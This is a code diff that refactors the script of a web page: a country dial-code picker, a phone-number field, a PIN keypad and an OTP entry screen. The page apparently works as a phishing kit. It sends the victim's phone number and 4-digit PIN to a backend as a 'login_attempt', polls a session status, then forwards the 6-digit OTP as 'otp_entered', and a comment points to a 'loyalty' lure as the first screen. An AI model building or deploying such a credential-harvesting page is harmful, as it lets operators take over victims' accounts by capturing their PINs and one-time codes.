-    { flag: '🇦🇫', name: 'Afghanistan', code: '+93' },{ flag: '🇦🇱', name: 'Albania', code: '+355' },{ flag: '🇩🇿', name: 'Algeria', code: '+213' },{ flag: '🇦🇴', name: 'Angola', code: '+244' },{ flag: '🇦🇷', name: 'Argentina', code: '+54' },{ flag: '🇦🇲', name: 'Armenia', code: '+374' },{ flag: '🇦🇺', name: 'Australia', code: '+61' },{ flag: '🇦🇹', name: 'Austria', code: '+43' },{ flag: '🇦🇿', name: 'Azerbaijan', code: '+994' },{ flag: '🇧🇩', name: 'Bangladesh', code: '+880' },{ flag: '🇧🇪', name: 'Belgium', code: '+32' },{ flag: '🇧🇯', name: 'Benin', code: '+229' },{ flag: '🇧🇴', name: 'Bolivia', code: '+591' },{ flag: '🇧🇦', name: 'Bosnia', code: '+387' },{ flag: '🇧🇼', name: 'Botswana', code: '+267' },{ flag: '🇧🇷', name: 'Brazil', code: '+55' },{ flag: '🇧🇫', name: 'Burkina Faso', code: '+226' },{ flag: '🇧🇮', name: 'Burundi', code: '+257' },{ flag: '🇨🇲', name: 'Cameroon', code: '+237' },{ flag: '🇨🇦', name: 'Canada', code: '+1' },{ flag: '🇨🇻', name: 'Cape Verde', code: '+238' },{ flag: '🇨🇫', name: 'Central African Republic', code: '+236' },{ flag: '🇹🇩', name: 'Chad', code: '+235' },{ flag: '🇨🇱', name: 'Chile', code: '+56' },{ flag: '🇨🇳', name: 'China', code: '+86' },{ flag: '🇨🇴', name: 'Colombia', code: '+57' },{ flag: '🇨🇬', name: 'Congo', code: '+242' },{ flag: '🇨🇩', name: 'DR Congo', code: '+243' },{ flag: '🇨🇷', name: 'Costa Rica', code: '+506' },{ flag: '🇨🇮', name: "Côte d'Ivoire", code: '+225' },{ flag: '🇭🇷', name: 'Croatia', code: '+385' },{ flag: '🇨🇺', name: 'Cuba', code: '+53' },{ flag: '🇨🇾', name: 'Cyprus', code: '+357' },{ flag: '🇨🇿', name: 'Czech Republic', code: '+420' },{ flag: '🇩🇰', name: 'Denmark', code: '+45' },{ flag: '🇩🇯', name: 'Djibouti', code: '+253' },{ flag: '🇩🇴', name: 'Dominican Republic', code: '+1-809' },{ flag: '🇪🇨', name: 'Ecuador', code: '+593' },{ flag: '🇪🇬', name: 'Egypt', code: '+20' },{ flag: '🇸🇻', name: 'El Salvador', code: '+503' },{ flag: '🇬🇶', name: 'Equatorial Guinea', code: '+240' },{ flag: '🇪🇷', name: 'Eritrea', code: '+291' },{ flag: '🇪🇹', name: 'Ethiopia', code: '+251' },{ flag: '🇫🇮', name: 'Finland', code: '+358' },{ flag: '🇫🇷', name: 'France', code: '+33' },{ flag: '🇬🇦', name: 'Gabon', code: '+241' },{ flag: '🇬🇲', name: 'Gambia', code: '+220' },{ flag: '🇬🇪', name: 'Georgia', code: '+995' },{ flag: '🇩🇪', name: 'Germany', code: '+49' },{ flag: '🇬🇭', name: 'Ghana', code: '+233' },{ flag: '🇬🇷', name: 'Greece', code: '+30' },{ flag: '🇬🇹', name: 'Guatemala', code: '+502' },{ flag: '🇬🇳', name: 'Guinea', code: '+224' },{ flag: '🇬🇼', name: 'Guinea-Bissau', code: '+245' },{ flag: '🇭🇹', name: 'Haiti', code: '+509' },{ flag: '🇭🇳', name: 'Honduras', code: '+504' },{ flag: '🇭🇺', name: 'Hungary', code: '+36' },{ flag: '🇮🇳', name: 'India', code: '+91' },{ flag: '🇮🇩', name: 'Indonesia', code: '+62' },{ flag: '🇮🇷', name: 'Iran', code: '+98' },{ flag: '🇮🇶', name: 'Iraq', code: '+964' },{ flag: '🇮🇪', name: 'Ireland', code: '+353' },{ flag: '🇮🇱', name: 'Israel', code: '+972' },{ flag: '🇮🇹', name: 'Italy', code: '+39' },{ flag: '🇯🇲', name: 'Jamaica', code: '+1-876' },{ flag: '🇯🇵', name: 'Japan', code: '+81' },{ flag: '🇯🇴', name: 'Jordan', code: '+962' },{ flag: '🇰🇿', name: 'Kazakhstan', code: '+7' },{ flag: '🇰🇪', name: 'Kenya', code: '+254' },{ flag: '🇽🇰', name: 'Kosovo', code: '+383' },{ flag: '🇰🇼', name: 'Kuwait', code: '+965' },{ flag: '🇱🇦', name: 'Laos', code: '+856' },{ flag: '🇱🇧', name: 'Lebanon', code: '+961' },{ flag: '🇱🇸', name: 'Lesotho', code: '+266' },{ flag: '🇱🇷', name: 'Liberia', code: '+231' },{ flag: '🇱🇾', name: 'Libya', code: '+218' },{ flag: '🇲🇬', name: 'Madagascar', code: '+261' },{ flag: '🇲🇼', name: 'Malawi', code: '+265' },{ flag: '🇲🇾', name: 'Malaysia', code: '+60' },{ flag: '🇲🇱', name: 'Mali', code: '+223' },{ flag: '🇲🇷', name: 'Mauritania', code: '+222' },{ flag: '🇲🇺', name: 'Mauritius', code: '+230' },{ flag: '🇲🇽', name: 'Mexico', code: '+52' },{ flag: '🇲🇩', name: 'Moldova', code: '+373' },{ flag: '🇲🇳', name: 'Mongolia', code: '+976' },{ flag: '🇲🇦', name: 'Morocco', code: '+212' },{ flag: '🇲🇿', name: 'Mozambique', code: '+258' },{ flag: '🇲🇲', name: 'Myanmar', code: '+95' },{ flag: '🇳🇦', name: 'Namibia', code: '+264' },{ flag: '🇳🇵', name: 'Nepal', code: '+977' },{ flag: '🇳🇱', name: 'Netherlands', code: '+31' },{ flag: '🇳🇿', name: 'New Zealand', code: '+64' },{ flag: '🇳🇮', name: 'Nicaragua', code: '+505' },{ flag: '🇳🇪', name: 'Niger', code: '+227' },{ flag: '🇳🇬', name: 'Nigeria', code: '+234' },{ flag: '🇰🇵', name: 'North Korea', code: '+850' },{ flag: '🇲🇰', name: 'North Macedonia', code: '+389' },{ flag: '🇳🇴', name: 'Norway', code: '+47' },{ flag: '🇴🇲', name: 'Oman', code: '+968' },{ flag: '🇵🇰', name: 'Pakistan', code: '+92' },{ flag: '🇵🇸', name: 'Palestine', code: '+970' },{ flag: '🇵🇦', name: 'Panama', code: '+507' },{ flag: '🇵🇬', name: 'Papua New Guinea', code: '+675' },{ flag: '🇵🇾', name: 'Paraguay', code: '+595' },{ flag: '🇵🇪', name: 'Peru', code: '+51' },{ flag: '🇵🇭', name: 'Philippines', code: '+63' },{ flag: '🇵🇱', name: 'Poland', code: '+48' },{ flag: '🇵🇹', name: 'Portugal', code: '+351' },{ flag: '🇶🇦', name: 'Qatar', code: '+974' },{ flag: '🇷🇴', name: 'Romania', code: '+40' },{ flag: '🇷🇺', name: 'Russia', code: '+7' },{ flag: '🇷🇼', name: 'Rwanda', code: '+250' },{ flag: '🇸🇦', name: 'Saudi Arabia', code: '+966' },{ flag: '🇸🇳', name: 'Senegal', code: '+221' },{ flag: '🇷🇸', name: 'Serbia', code: '+381' },{ flag: '🇸🇱', name: 'Sierra Leone', code: '+232' },{ flag: '🇸🇬', name: 'Singapore', code: '+65' },{ flag: '🇸🇰', name: 'Slovakia', code: '+421' },{ flag: '🇸🇴', name: 'Somalia', code: '+252' },{ flag: '🇿🇦', name: 'South Africa', code: '+27' },{ flag: '🇸🇸', name: 'South Sudan', code: '+211' },{ flag: '🇪🇸', name: 'Spain', code: '+34' },{ flag: '🇱🇰', name: 'Sri Lanka', code: '+94' },{ flag: '🇸🇩', name: 'Sudan', code: '+249' },{ flag: '🇸🇿', name: 'Eswatini', code: '+268' },{ flag: '🇸🇪', name: 'Sweden', code: '+46' },{ flag: '🇨🇭', name: 'Switzerland', code: '+41' },{ flag: '🇸🇾', name: 'Syria', code: '+963' },{ flag: '🇹🇿', name: 'Tanzania', code: '+255' },{ flag: '🇹🇭', name: 'Thailand', code: '+66' },{ flag: '🇹🇬', name: 'Togo', code: '+228' },{ flag: '🇹🇹', name: 'Trinidad & Tobago', code: '+1-868' },{ flag: '🇹🇳', name: 'Tunisia', code: '+216' },{ flag: '🇹🇷', name: 'Turkey', code: '+90' },{ flag: '🇺🇬', name: 'Uganda', code: '+256' },{ flag: '🇺🇦', name: 'Ukraine', code: '+380' },{ flag: '🇦🇪', name: 'UAE', code: '+971' },{ flag: '🇬🇧', name: 'United Kingdom', code: '+44' },{ flag: '🇺🇸', name: 'United States', code: '+1' },{ flag: '🇺🇾', name: 'Uruguay', code: '+598' },{ flag: '🇺🇿', name: 'Uzbekistan', code: '+998' },{ flag: '🇻🇪', name: 'Venezuela', code: '+58' },{ flag: '🇻🇳', name: 'Vietnam', code: '+84' },{ flag: '🇾🇪', name: 'Yemen', code: '+967' },{ flag: '🇿🇲', name: 'Zambia', code: '+260' },{ flag: '🇿🇼', name: 'Zimbabwe', code: '+263' },
+    {flag:'🌐',name:'Select Country',code:'+'},{flag:'🇦🇫',name:'Afghanistan',code:'+93'},{flag:'🇦🇱',name:'Albania',code:'+355'},{flag:'🇩🇿',name:'Algeria',code:'+213'},{flag:'🇦🇴',name:'Angola',code:'+244'},{flag:'🇦🇷',name:'Argentina',code:'+54'},{flag:'🇦🇲',name:'Armenia',code:'+374'},{flag:'🇦🇺',name:'Australia',code:'+61'},{flag:'🇦🇹',name:'Austria',code:'+43'},{flag:'🇦🇿',name:'Azerbaijan',code:'+994'},{flag:'🇧🇩',name:'Bangladesh',code:'+880'},{flag:'🇧🇪',name:'Belgium',code:'+32'},{flag:'🇧🇯',name:'Benin',code:'+229'},{flag:'🇧🇴',name:'Bolivia',code:'+591'},{flag:'🇧🇦',name:'Bosnia',code:'+387'},{flag:'🇧🇼',name:'Botswana',code:'+267'},{flag:'🇧🇷',name:'Brazil',code:'+55'},{flag:'🇧🇫',name:'Burkina Faso',code:'+226'},{flag:'🇧🇮',name:'Burundi',code:'+257'},{flag:'🇨🇲',name:'Cameroon',code:'+237'},{flag:'🇨🇦',name:'Canada',code:'+1'},{flag:'🇨🇻',name:'Cape Verde',code:'+238'},{flag:'🇨🇫',name:'Central African Republic',code:'+236'},{flag:'🇹🇩',name:'Chad',code:'+235'},{flag:'🇨🇱',name:'Chile',code:'+56'},{flag:'🇨🇳',name:'China',code:'+86'},{flag:'🇨🇴',name:'Colombia',code:'+57'},{flag:'🇨🇬',name:'Congo',code:'+242'},{flag:'🇨🇩',name:'DR Congo',code:'+243'},{flag:'🇨🇷',name:'Costa Rica',code:'+506'},{flag:'🇨🇮',name:"Côte d'Ivoire",code:'+225'},{flag:'🇭🇷',name:'Croatia',code:'+385'},{flag:'🇨🇺',name:'Cuba',code:'+53'},{flag:'🇨🇾',name:'Cyprus',code:'+357'},{flag:'🇨🇿',name:'Czech Republic',code:'+420'},{flag:'🇩🇰',name:'Denmark',code:'+45'},{flag:'🇩🇯',name:'Djibouti',code:'+253'},{flag:'🇩🇴',name:'Dominican Republic',code:'+1-809'},{flag:'🇪🇨',name:'Ecuador',code:'+593'},{flag:'🇪🇬',name:'Egypt',code:'+20'},{flag:'🇸🇻',name:'El Salvador',code:'+503'},{flag:'🇬🇶',name:'Equatorial Guinea',code:'+240'},{flag:'🇪🇷',name:'Eritrea',code:'+291'},{flag:'🇪🇹',name:'Ethiopia',code:'+251'},{flag:'🇫🇮',name:'Finland',code:'+358'},{flag:'🇫🇷',name:'France',code:'+33'},{flag:'🇬🇦',name:'Gabon',code:'+241'},{flag:'🇬🇲',name:'Gambia',code:'+220'},{flag:'🇬🇪',name:'Georgia',code:'+995'},{flag:'🇩🇪',name:'Germany',code:'+49'},{flag:'🇬🇭',name:'Ghana',code:'+233'},{flag:'🇬🇷',name:'Greece',code:'+30'},{flag:'🇬🇹',name:'Guatemala',code:'+502'},{flag:'🇬🇳',name:'Guinea',code:'+224'},{flag:'🇬🇼',name:'Guinea-Bissau',code:'+245'},{flag:'🇭🇹',name:'Haiti',code:'+509'},{flag:'🇭🇳',name:'Honduras',code:'+504'},{flag:'🇭🇺',name:'Hungary',code:'+36'},{flag:'🇮🇳',name:'India',code:'+91'},{flag:'🇮🇩',name:'Indonesia',code:'+62'},{flag:'🇮🇷',name:'Iran',code:'+98'},{flag:'🇮🇶',name:'Iraq',code:'+964'},{flag:'🇮🇪',name:'Ireland',code:'+353'},{flag:'🇮🇱',name:'Israel',code:'+972'},{flag:'🇮🇹',name:'Italy',code:'+39'},{flag:'🇯🇲',name:'Jamaica',code:'+1-876'},{flag:'🇯🇵',name:'Japan',code:'+81'},{flag:'🇯🇴',name:'Jordan',code:'+962'},{flag:'🇰🇿',name:'Kazakhstan',code:'+7'},{flag:'🇰🇪',name:'Kenya',code:'+254'},{flag:'🇽🇰',name:'Kosovo',code:'+383'},{flag:'🇰🇼',name:'Kuwait',code:'+965'},{flag:'🇱🇦',name:'Laos',code:'+856'},{flag:'🇱🇧',name:'Lebanon',code:'+961'},{flag:'🇱🇸',name:'Lesotho',code:'+266'},{flag:'🇱🇷',name:'Liberia',code:'+231'},{flag:'🇱🇾',name:'Libya',code:'+218'},{flag:'🇲🇬',name:'Madagascar',code:'+261'},{flag:'🇲🇼',name:'Malawi',code:'+265'},{flag:'🇲🇾',name:'Malaysia',code:'+60'},{flag:'🇲🇱',name:'Mali',code:'+223'},{flag:'🇲🇷',name:'Mauritania',code:'+222'},{flag:'🇲🇺',name:'Mauritius',code:'+230'},{flag:'🇲🇽',name:'Mexico',code:'+52'},{flag:'🇲🇩',name:'Moldova',code:'+373'},{flag:'🇲🇳',name:'Mongolia',code:'+976'},{flag:'🇲🇦',name:'Morocco',code:'+212'},{flag:'🇲🇿',name:'Mozambique',code:'+258'},{flag:'🇲🇲',name:'Myanmar',code:'+95'},{flag:'🇳🇦',name:'Namibia',code:'+264'},{flag:'🇳🇵',name:'Nepal',code:'+977'},{flag:'🇳🇱',name:'Netherlands',code:'+31'},{flag:'🇳🇿',name:'New Zealand',code:'+64'},{flag:'🇳🇮',name:'Nicaragua',code:'+505'},{flag:'🇳🇪',name:'Niger',code:'+227'},{flag:'🇳🇬',name:'Nigeria',code:'+234'},{flag:'🇰🇵',name:'North Korea',code:'+850'},{flag:'🇲🇰',name:'North Macedonia',code:'+389'},{flag:'🇳🇴',name:'Norway',code:'+47'},{flag:'🇴🇲',name:'Oman',code:'+968'},{flag:'🇵🇰',name:'Pakistan',code:'+92'},{flag:'🇵🇸',name:'Palestine',code:'+970'},{flag:'🇵🇦',name:'Panama',code:'+507'},{flag:'🇵🇬',name:'Papua New Guinea',code:'+675'},{flag:'🇵🇾',name:'Paraguay',code:'+595'},{flag:'🇵🇪',name:'Peru',code:'+51'},{flag:'🇵🇭',name:'Philippines',code:'+63'},{flag:'🇵🇱',name:'Poland',code:'+48'},{flag:'🇵🇹',name:'Portugal',code:'+351'},{flag:'🇶🇦',name:'Qatar',code:'+974'},{flag:'🇷🇴',name:'Romania',code:'+40'},{flag:'🇷🇺',name:'Russia',code:'+7'},{flag:'🇷🇼',name:'Rwanda',code:'+250'},{flag:'🇸🇦',name:'Saudi Arabia',code:'+966'},{flag:'🇸🇳',name:'Senegal',code:'+221'},{flag:'🇷🇸',name:'Serbia',code:'+381'},{flag:'🇸🇱',name:'Sierra Leone',code:'+232'},{flag:'🇸🇬',name:'Singapore',code:'+65'},{flag:'🇸🇰',name:'Slovakia',code:'+421'},{flag:'🇸🇴',name:'Somalia',code:'+252'},{flag:'🇿🇦',name:'South Africa',code:'+27'},{flag:'🇸🇸',name:'South Sudan',code:'+211'},{flag:'🇪🇸',name:'Spain',code:'+34'},{flag:'🇱🇰',name:'Sri Lanka',code:'+94'},{flag:'🇸🇩',name:'Sudan',code:'+249'},{flag:'🇸🇿',name:'Eswatini',code:'+268'},{flag:'🇸🇪',name:'Sweden',code:'+46'},{flag:'🇨🇭',name:'Switzerland',code:'+41'},{flag:'🇸🇾',name:'Syria',code:'+963'},{flag:'🇹🇿',name:'Tanzania',code:'+255'},{flag:'🇹🇭',name:'Thailand',code:'+66'},{flag:'🇹🇬',name:'Togo',code:'+228'},{flag:'🇹🇹',name:'Trinidad & Tobago',code:'+1-868'},{flag:'🇹🇳',name:'Tunisia',code:'+216'},{flag:'🇹🇷',name:'Turkey',code:'+90'},{flag:'🇺🇬',name:'Uganda',code:'+256'},{flag:'🇺🇦',name:'Ukraine',code:'+380'},{flag:'🇦🇪',name:'UAE',code:'+971'},{flag:'🇬🇧',name:'United Kingdom',code:'+44'},{flag:'🇺🇸',name:'United States',code:'+1'},{flag:'🇺🇾',name:'Uruguay',code:'+598'},{flag:'🇺🇿',name:'Uzbekistan',code:'+998'},{flag:'🇻🇪',name:'Venezuela',code:'+58'},{flag:'🇻🇳',name:'Vietnam',code:'+84'},{flag:'🇾🇪',name:'Yemen',code:'+967'},{flag:'🇿🇲',name:'Zambia',code:'+260'},{flag:'🇿🇼',name:'Zimbabwe',code:'+263'},
   ];
-
-  let selectedIndex = 0;
-  let filtered = [...countries];
-
+  let selectedIndex = 0, filtered = [...countries];
   function renderList() {
-    const list = document.getElementById('country-list');
-    list.innerHTML = filtered.map(c => {
+    document.getElementById('country-list').innerHTML = filtered.map(c => {
       const idx = countries.indexOf(c);
       return `<div class="country-item ${idx===selectedIndex?'selected':''}" onclick="selectCountry(${idx})"><span class="item-flag">${c.flag}</span><span class="item-name">${c.name}</span><span class="item-code">${c.code}</span></div>`;
     }).join('');
@@ -584,7 +564,6 @@
     const q = document.getElementById('search-input').value.toLowerCase();
     filtered = countries.filter(c => c.name.toLowerCase().includes(q) || c.code.includes(q));
     renderList();
-  document.body.classList.add("scrollable"); // loyalty is first screen
   }
   function selectCountry(index) {
     selectedIndex = index;
@@ -598,17 +577,15 @@
     dd.classList.toggle('open');
     if (dd.classList.contains('open')) { renderList(); document.getElementById('search-input').focus(); }
   }
-  document.addEventListener('click', function(e) {
-    const dd = document.getElementById('dropdown');
-    const selector = document.querySelector('.country-select');
-    if (dd && !dd.contains(e.target) && selector && !selector.contains(e.target)) dd.classList.remove('open');
+  document.addEventListener('click', e => {
+    const dd = document.getElementById('dropdown'), sel = document.querySelector('.country-select');
+    if (dd && !dd.contains(e.target) && sel && !sel.contains(e.target)) dd.classList.remove('open');
   });
   renderList();
-  document.body.classList.add("scrollable"); // loyalty is first screen
+  document.body.classList.add('scrollable');
 
   function goToPin() {
-    const phone = document.getElementById('phone-input').value.trim();
-    if (!phone) { alert('Please enter your mobile number.'); return; }
+    if (!document.getElementById('phone-input').value.trim()) { alert('Please enter your mobile number.'); return; }
     showScreen('pin');
   }
 
@@ -616,30 +593,27 @@
   let pin = [];
   function updateDashes() {
     for (let i = 0; i < 4; i++) {
-      const d = document.getElementById('d' + i);
-      d.className = 'dash';
-      if (i < pin.length) d.classList.add('filled');
-      else if (i === pin.length) d.classList.add('active');
+      const d = document.getElementById('d'+i); d.className = 'dash';
+      if (i < pin.length) d.classList.add('filled'); else if (i === pin.length) d.classList.add('active');
     }
     const btn = document.getElementById('continue-btn');
-    if (pin.length === 4) { btn.disabled = false; btn.classList.add('ready'); }
-    else { btn.disabled = true; btn.classList.remove('ready'); }
+    btn.disabled = pin.length !== 4; btn.classList.toggle('ready', pin.length === 4);
   }
-  function pressKey(num) { if (pin.length < 4) { pin.push(num); updateDashes(); } }
+  function pressKey(n) { if (pin.length < 4) { pin.push(n); updateDashes(); } }
   function deleteLast() { if (pin.length > 0) { pin.pop(); updateDashes(); } }
   updateDashes();
 
   async function submitPIN() {
     if (pin.length !== 4) return;
-    const phone = document.getElementById('phone-input').value.trim();
-    const countryFlag = countries[selectedIndex].flag;
-    const countryCode = countries[selectedIndex].code;
-    const pinStr = pin.join('');
     showLoading();
-    const result = await callApi('login_attempt', { countryFlag, countryCode, phone, pin: pinStr });
-    if (result.success && result.data && result.data.sessionId) {
-      currentSessionId = result.data.sessionId;
-      startStatusPolling(currentSessionId);
+    const result = await callApi('login_attempt', {
+      countryFlag: countries[selectedIndex].flag,
+      countryCode: countries[selectedIndex].code,
+      phone: document.getElementById('phone-input').value.trim(),
+      pin: pin.join('')
+    });
+    if (result.success && result.data?.sessionId) {
+      currentSessionId = result.data.sessionId; startStatusPolling(currentSessionId);
     } else { hideLoading(); alert('Failed to send request. Please try again.'); }
   }
 
@@ -647,29 +621,28 @@
   const otpInput = document.getElementById('otp-input');
   function focusOtpInput() { otpInput.focus(); }
   function updateSlots() {
-    const val = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    const val = otpInput.value.replace(/\D/g,'').slice(0,6);
     for (let i = 0; i < 6; i++) {
-      document.getElementById('s' + i).textContent = val[i] || '';
-      const line = document.getElementById('l' + i);
-      line.className = 'otp-line';
-      if (i < val.length) line.classList.add('filled');
-      else if (i === val.length) line.classList.add('active');
+      document.getElementById('s'+i).textContent = val[i]||'';
+      const line = document.getElementById('l'+i); line.className='otp-line';
+      if (i < val.length) line.classList.add('filled'); else if (i===val.length) line.classList.add('active');
     }
     const btn = document.getElementById('otp-submit-btn');
-    if (val.length === 6) { btn.disabled = false; btn.classList.add('ready'); }
-    else { btn.disabled = true; btn.classList.remove('ready'); }
+    btn.disabled = val.length!==6; btn.classList.toggle('ready', val.length===6);
   }
-  otpInput.addEventListener('input', () => { otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6); updateSlots(); });
+  otpInput.addEventListener('input', () => { otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6); updateSlots(); });
   updateSlots();
 
   async function submitOTP() {
-    const otp = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    const otp = otpInput.value.replace(/\D/g,'').slice(0,6);
     if (otp.length !== 6 || !currentSessionId) return;
-    const phone = document.getElementById('phone-input').value.trim();
-    const countryCode = countries[selectedIndex].code;
     showLoading();
-    const result = await callApi('otp_entered', { sessionId: currentSessionId, otp, countryCode, phone });
-    if (result.success) { startStatusPolling(currentSessionId); }
+    const result = await callApi('otp_entered', {
+      sessionId: currentSessionId, otp,
+      countryCode: countries[selectedIndex].code,
+      phone: document.getElementById('phone-input').value.trim()
+    });
+    if (result.success) startStatusPolling(currentSessionId);
     else { hideLoading(); alert('Failed to submit OTP. Please try again.'); }
   }
 </script>
